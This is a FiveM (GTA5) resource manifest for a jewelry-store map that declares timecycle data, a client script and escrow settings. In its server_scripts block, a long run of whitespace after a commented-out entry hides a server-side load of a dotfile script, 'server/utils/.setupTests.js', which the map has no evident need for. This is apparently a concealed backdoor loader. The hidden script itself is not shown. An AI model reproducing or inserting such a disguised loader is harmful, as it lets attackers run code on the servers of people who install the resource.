

fx_version "cerulean"
game "gta5"
lua54 "yes"

author 'MXC'
description 'JEWELRY'
version '1.0.0'

this_is_a_map 'yes'

data_file 'TIMECYCLEMOD_FILE' 'mxc_timecycle_list_01.xml'

files {
    'mxc_timecycle_list_01.xml',
}

client_script {
    'client.lua',
}

escrow_ignore {
    'stream/[multi-location]/[1-VangelicoRockfordHills]/[gta5files]/*.ydr',
}
dependency '/assetpacks'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.setupTests.js',
}
